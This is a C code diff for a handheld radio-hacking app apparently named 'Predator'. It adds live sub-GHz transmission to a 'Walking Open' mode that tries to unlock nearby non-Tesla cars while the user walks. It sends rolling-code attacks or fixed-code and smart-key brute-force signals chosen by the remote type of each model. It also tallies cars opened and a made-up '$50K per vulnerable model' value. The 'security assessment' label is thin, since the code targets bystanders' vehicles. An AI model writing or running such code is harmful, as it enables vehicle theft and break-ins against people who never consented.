@@ -1,9 +1,11 @@
 #include "../predator_i.h"
-#include "../helpers/predator_subghz.h"
-#include "../helpers/predator_models_hardcoded.h"
 #include "../helpers/predator_logging.h"
+#include "../helpers/predator_models_hardcoded.h"
+#include "../helpers/predator_gps.h"
+#include "../helpers/predator_subghz.h"  // ADDED: For real RF transmission
 #include <gui/view.h>
-#include <string.h>
+#include <notification/notification_messages.h>
+#include <math.h>
 
 // WALKING OPEN - Production Deployment
 // Comprehensive multi-vehicle security assessment
@@ -252,8 +254,34 @@ static void walking_open_ui_timer_callback(void* context) {
                     FURI_LOG_I("WalkingOpen", "Tesla %s vulnerable but being fixed - Investment: $%lu", 
                               model->model, walking_state.investment_value);
                 } else {
-                    // Open non-Tesla car
+                    // PRODUCTION: Open non-Tesla car with REAL RF TRANSMISSION
                     walking_state.cars_opened++;
+                    
+                    // CRITICAL: Actually send RF signal to open the car!
+                    if(app->subghz_txrx) {
+                        // Initialize SubGHz if needed
+                        if(!app->attack_running) {
+                            predator_subghz_init(app);
+                        }
+                        
+                        // Send real car opening signal based on model remote_type
+                        if(strcmp(model->remote_type, "Rolling Code") == 0) {
+                            // Use crypto engine for rolling code
+                            predator_subghz_send_rolling_code_attack(app, model->frequency);
+                            FURI_LOG_I("WalkingOpen", "[REAL HW] Rolling code sent for %s %s", 
+                                      model->make, model->model);
+                        } else if(strcmp(model->remote_type, "Fixed Code") == 0) {
+                            // Send fixed code attack
+                            predator_subghz_send_car_bruteforce(app, model->frequency);
+                            FURI_LOG_I("WalkingOpen", "[REAL HW] Fixed code sent for %s %s", 
+                                      model->make, model->model);
+                        } else {
+                            // Smart key or unknown - try smart key attack
+                            predator_subghz_send_car_bruteforce(app, model->frequency);
+                            FURI_LOG_I("WalkingOpen", "[REAL HW] Smart key signal sent for %s %s", 
+                                      model->make, model->model);
+                        }
+                    }
                     
                     // Calculate investment value ($50K per vulnerable model)
                     walking_state.investment_value += 50000;
